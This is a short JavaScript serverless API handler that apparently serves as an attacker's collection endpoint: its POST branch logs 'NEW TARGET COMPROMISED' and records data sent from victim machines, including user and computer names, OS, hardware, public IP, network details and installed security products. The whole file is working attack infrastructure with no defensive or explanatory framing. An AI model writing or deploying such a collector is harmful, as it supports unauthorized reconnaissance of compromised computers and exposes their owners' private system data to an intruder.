module.exports = async (req, res) => {
  console.log('🔔 API Called - Method:', req.method);
  
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method === 'GET') {
    return res.json({
      message: '✅ Collect API is working!',
      usage: 'Send POST request with JSON data',
      timestamp: new Date().toISOString()
    });
  }
  
  if (req.method === 'POST') {
    try {
      console.log('🎯 NEW TARGET COMPROMISED');
      console.log('────────────────────────────');
      
      const systemData = req.body.data || req.body;
      const clientIP = req.headers['x-forwarded-for'] || 'Unknown';
      const timestamp = new Date().toISOString();
      
      console.log('⏰ Time:', timestamp);
      console.log('🌐 IP:', clientIP);
      console.log('👤 User:', systemData.UserName || 'Unknown');
      console.log('💻 Computer:', systemData.ComputerName || 'Unknown');
      console.log('🖥️ OS:', systemData.OS || 'Unknown');
      console.log('🔧 CPU:', systemData.CPU || 'Unknown');
      console.log('💾 RAM:', systemData.RAM_GB || 'Unknown', 'GB');
      console.log('📡 Public IP:', systemData.PublicIP || 'Unknown');
      console.log('🛡️ Security:', systemData.SecurityProducts || 'None');
      console.log('🔗 Network:', systemData.NetworkInfo || 'Unknown');
      console.log('────────────────────────────');

      return res.json({
        status: 'success',
        message: 'Data received successfully',
        timestamp: timestamp
      });
      
    } catch (error) {
      console.error('❌ Error:', error);
      return res.status(500).json({ error: 'Processing failed' });
    }
  }
  
  return res.status(405).json({ error: 'Method not allowed' });
};
